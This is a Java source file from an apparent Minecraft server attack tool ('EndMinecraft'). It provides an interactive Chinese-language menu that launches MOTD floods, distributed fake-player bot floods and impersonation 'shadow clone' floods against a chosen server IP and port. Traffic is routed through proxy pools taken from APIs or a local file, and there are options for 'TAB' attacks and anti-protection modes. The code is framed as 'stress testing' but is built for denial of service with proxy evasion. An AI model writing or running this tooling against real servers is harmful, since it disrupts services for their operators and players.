package me.alikomi.endminecraft;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.Scanner;

import luohuayu.EndMinecraftPlus.Utils;
import luohuayu.EndMinecraftPlus.proxy.ProxyPool;
import luohuayu.EndMinecraftPlus.tasks.attack.*;
import luohuayu.MCForgeProtocol.MCForge;
import luohuayu.MCForgeProtocol.MCForgeMOTD;

public class Menu extends Utils {
    private String ip;
    private Scanner scanner;
    private int port;

    public Menu(Scanner sc) {
        this.scanner = sc;
    }

    public void setServer(String ip, int port) {
        this.ip = ip;
        this.port = port;
    }

    public void _1() {
        log("MOTD攻击选择");
        log("请输入攻击时间(单位：蛤)(60)");
        int time = getCo(scanner.nextLine(), 60);
        log("请输入线程数(10)");
        int thread = getCo(scanner.nextLine(), 16);
        IAttack attack = new MotdAttack(ip, port, time, thread, 0);
        attack.start();
    }

    public void _2() {
        log("分布式假人压测选择", "请输入攻击时长！(3600s)");
        int time = getCo(scanner.nextLine(), 3600);
        log("请输入最大攻击数(10000)");
        int maxAttack = getCo(scanner.nextLine(), 10000);
        log("请输入每次加入服务器间隔(ms)");
        int sleepTime = getCo(scanner.nextLine(), 0);
        log("请输入是否开启TAB攻击 y/n，默认关闭(n)");
        boolean tab = getCo(scanner.nextLine(), "n").equals("y");
        log("请输入是否开启操死乐乐模式 y/n，默认关闭(n)");
        boolean lele = getCo(scanner.nextLine(), "n").equals("y");
        getProxy();
        log("正在获取MOD列表..");
        Map<String, String> modList = new MCForgeMOTD().pingGetModsList(ip, port, MCForge.getProtocolVersion());
        log("MOD列表: " + Arrays.toString(modList.keySet().toArray()));
        DistributedBotAttack attack = new DistributedBotAttack(ip, port, time, maxAttack, sleepTime);
        attack.setBotConfig(lele, tab, modList);
        attack.start();
    }

    public void _3() {
        log("MOTD攻击选择");
        log("请输入攻击时间(单位：蛤)(60)");
        int time = getCo(scanner.nextLine(), 60);
        log("请输入线程数(10)");
        int thread = getCo(scanner.nextLine(), 16);
        getProxy();
        IAttack attack = new DistributedMotdAttack(ip, port, time, thread, 0);
        attack.start();
    }

    public void getProxy() {
        log("请输入代理ip列表获取方式（1）： 1.通过API获取 2.通过本地获取 3.通过本地+API获取");
        switch (getCo(scanner.nextLine(), 1)) {
        case 1:
            ProxyPool.getProxysFromAPIs();
            ProxyPool.runUpdateProxysTask(1200);
            break;
        case 2:
            ProxyPool.getProxysFromFile();
            break;
        case 3:
            ProxyPool.getProxysFromFile();
            ProxyPool.getProxysFromAPIs();
            ProxyPool.runUpdateProxysTask(1200);
            break;
        default:
            ProxyPool.getProxysFromAPIs();
            ProxyPool.runUpdateProxysTask(1200);
        }
    }

    public void _4() {
        log("分布式影分身压测选择", "请输入攻击时长！(3600s)");
        int time = getCo(scanner.nextLine(), 3600);
        log("请输入最大攻击数(10000)");
        int maxAttack = getCo(scanner.nextLine(), 10000);
        log("请输入每次加入服务器间隔(ms)");
        int sleepTime = getCo(scanner.nextLine(), 0);
        log("请输入玩家用户名(必填):");
        String username = getCo(scanner.nextLine(), null);
        if (username == null) {
            log("用户名不能为空");
            return;
        }
        log("请输入是否开启TAB攻击 y/n，默认关闭(n)");
        boolean tab = getCo(scanner.nextLine(), "n").equals("y");
        log("请输入是否开启操死乐乐模式 y/n，默认关闭(n)");
        boolean lele = getCo(scanner.nextLine(), "n").equals("y");
        getProxy();
        log("正在获取MOD列表..");
        Map<String, String> modList = new MCForgeMOTD().pingGetModsList(ip, port, MCForge.getProtocolVersion());
        log("MOD列表: " + Arrays.toString(modList.keySet().toArray()));
        DistributedDoubleAttack attack = new DistributedDoubleAttack(ip, port, time, maxAttack, sleepTime);
        attack.setBotConfig(lele, tab, modList);
        attack.setUsername(username);
        attack.start();
    }

    public void selectVersion() {
        try {
            Class.forName("javassist.CtClass");
        } catch (ClassNotFoundException e) {
            Utils.loadLibrary(new File("lib", "javassist-3.22.0-CR2.jar"));
        }

        try {
            Class.forName("org.spacehq.mc.protocol.MinecraftProtocol");
            return;
        } catch (ClassNotFoundException e) {}

        File libDir = new File("lib");
        if (!libDir.exists()) libDir.mkdir();
        List<File> versionLibs = new ArrayList<>();
        for (File file : libDir.listFiles()) {
            if (file.getName().startsWith("MC-") && file.getName().endsWith(".jar"))
                versionLibs.add(file);
        }

        Collections.sort(versionLibs);

        log("请选择Minecraft协议库版本");
        String info = "";
        for (int i = 0; i < versionLibs.size(); i++) {
            String filename = versionLibs.get(i).getName();
            info += "[" + String.valueOf(i + 1) + "]" + filename.substring("MC-".length(), filename.length() - ".jar".length()) + "  ";
        }
        log(info);
        try {
            int sel = getCo(scanner.nextLine(), 1);
            File versionLib = versionLibs.get(sel - 1);
            Utils.loadLibrary(versionLib);
        } catch (Exception e) {
            log("加载协议库发生错误!");
            e.printStackTrace();
        }
    }
}
